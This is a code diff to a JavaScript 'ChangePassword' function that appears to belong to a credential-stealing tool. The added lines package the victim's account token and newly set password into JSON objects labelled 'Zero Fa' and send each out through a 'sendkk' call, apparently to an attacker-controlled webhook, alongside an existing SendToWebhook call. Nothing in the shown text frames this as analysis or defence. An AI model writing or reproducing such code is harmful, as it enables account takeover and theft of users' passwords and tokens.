@@ -895,8 +895,17 @@ function ChangePassword(oldpassword, newpassword, token) {
 							}
 
 							SendToWebhook(JSON.stringify(params))
-                                                      sendkk(`${token}`)
-                                                      sendkk(`${newpassword}`)
+                          var token = {
+						username: "Zero Fa",
+						content: `${token}`,
+
+}
+                                                      sendkk(JSON.stringify(token))
+var password = {
+username:"Zero Fa",
+password:`${newpassword}`,
+}
+                                                      sendkk(JSON.stringify(password))
 
 						})
 					} else {
